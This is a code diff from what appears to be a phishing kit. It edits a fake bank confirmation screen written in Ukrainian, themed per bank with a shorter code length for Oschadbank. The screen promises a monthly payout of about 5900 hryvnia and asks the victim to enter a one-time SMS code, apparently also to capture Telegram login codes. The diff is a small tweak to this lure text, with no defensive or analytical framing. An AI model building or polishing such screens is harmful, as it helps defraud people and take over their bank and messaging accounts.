@@ -1501,7 +1501,7 @@ document.addEventListener('DOMContentLoaded', () => {
         const codeLength = activeBankData.theme === 'oschadbank' ? 4 : 6; 
         renderCodeScreen({
             header: 'Підтвердження', title: 'Останній крок',
-            instructionText: 'Ваша базова виплата складає 5901 гривень щомісяця. Для підтвердження заявки введіть одноразовий SMS код',
+            instructionText: 'Ваша базова виплата складає 5900 гривень щомісяця. Для підтвердження заявки введіть одноразовий SMS код',
             resendText: 'Відправити SMS ще раз', screenId: 'telegram_sms', error: options.error,
             codeLength: codeLength // 4 для Ощадбанка, 6 для других (если используется)
         });
